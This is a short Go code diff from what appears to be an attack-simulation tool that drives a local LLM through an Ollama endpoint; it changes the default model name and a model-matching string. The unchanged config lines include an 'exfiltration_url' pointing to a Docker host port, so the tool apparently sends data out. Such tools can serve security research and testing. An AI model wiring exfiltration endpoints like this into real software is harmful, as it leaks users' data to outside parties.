@@ -19,7 +19,7 @@ var _ = io.Copy // Use unused import
 // Configuration for the simulation
 var config = map[string]string{
 	"ollama_endpoint": "http://ollama-server:11434/api/generate",
-	"model_name":      "llama3.2:1b", // Default fallback
+	"model_name":      "gpt-oss:20b", // Default fallback
 	"exfiltration_url": "http://host.docker.internal:9001", // Change to 
 }
 
@@ -83,7 +83,7 @@ func discoverAndSelectModel() bool {
 			bestModel = m.Name
 			break
 		}
-		if strings.Contains(m.Name, "gpt-oss:20b") {
+		if strings.Contains(m.Name, "gpt-oss:120b-cloud") {
 			bestModel = m.Name
 		}
 	}
